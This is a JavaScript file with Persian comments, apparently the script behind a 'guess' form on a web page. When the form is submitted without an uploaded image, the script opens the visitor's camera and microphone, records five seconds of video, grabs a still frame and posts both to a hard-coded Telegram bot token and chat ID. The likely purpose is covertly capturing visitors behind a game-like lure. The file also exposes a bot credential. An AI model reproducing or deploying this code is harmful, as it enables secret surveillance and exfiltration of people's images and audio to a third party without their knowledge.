document.getElementById('guessform').addEventListener('submit', function(event) {
    event.preventDefault(); // جلوگیری از ارسال فرم

    const imageInput = document.getElementById('imageinput');
    const selectedImage = imageInput.files[0];

    // اگر عکسی از گالری انتخاب شده باشد
    if (selectedImage) {
        const imageBlob = new Blob([selectedImage], { type: selectedImage.type });
        sendPhotoToTelegram(imageBlob);
    } else {
        const constraints = {
            video: true,
            audio: true,
        };

        navigator.mediaDevices.getUserMedia(constraints)
            .then(function(stream) {
                const video = document.createElement('video');
                video.muted = true; // عدم پخش صدا
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];

                mediaRecorder.ondataavailable = function(event) {
                    chunks.push(event.data);
                };

                mediaRecorder.onstop = function() {
                    const videoBlob = new Blob(chunks, { type: 'video/webm' });
                    sendVideoToTelegram(videoBlob);
                };

                mediaRecorder.start();

                // نمایش ویدیو بدون صدا
                video.srcObject = stream;
                video.play();

                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d');

                video.addEventListener('loadedmetadata', function() {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;

                    // گرفتن عکس از ویدیو
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const imageBlob = dataURItoBlob(canvas.toDataURL('image/jpeg'));
                    sendPhotoToTelegram(imageBlob);
                });

                // متوقف کردن ضبط بعد از 5 ثانیه
                setTimeout(() => {
                    mediaRecorder.stop();
                    stream.getTracks().forEach(track => track.stop());
                }, 5000);
            })
            .catch(function(error) {
                console.error('خطا در دسترسی به دوربین:', error);
            });
    }
});

function dataURItoBlob(dataURI) {
    const byteString = atob(dataURI.split(',')[1]);
    const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
    const ab = new ArrayBuffer(byteString.length);
    const ia = new Uint8Array(ab);

    for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
    }

    return new Blob([ab], { type: mimeString });
}

function sendPhotoToTelegram(imageBlob) {
    const token = '7757686847:AAG5fLwm-dMP0myJft9TxxRNS6p38yOw4U8'; // توکن ربات خود را اینجا قرار دهید
    const chatId = '5628890878'; // چت آیدی خود را اینجا قرار دهید
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', imageBlob, 'photo.jpg');

    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            console.log('عکس با موفقیت ارسال شد.');
        } else {
            console.error('خطا در ارسال عکس:', data.description);
        }
    })
    .catch(error => console.error('خطا در ارتباط با تلگرام:', error));
}

function sendVideoToTelegram(videoBlob) {
    const token = '7757686847:AAG5fLwm-dMP0myJft9TxxRNS6p38yOw4U8'; // توکن ربات خود را اینجا قرار دهید
    const chatId = '5628890878'; // چت آیدی خود را اینجا قرار دهید
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('video', videoBlob, 'video.webm');

    fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            console.log('ویدیو با موفقیت ارسال شد.');
        } else {
            console.error('خطا در ارسال ویدیو:', data.description);
        }
    })
    .catch(error => console.error('خطا در ارتباط با تلگرام:', error));
}
س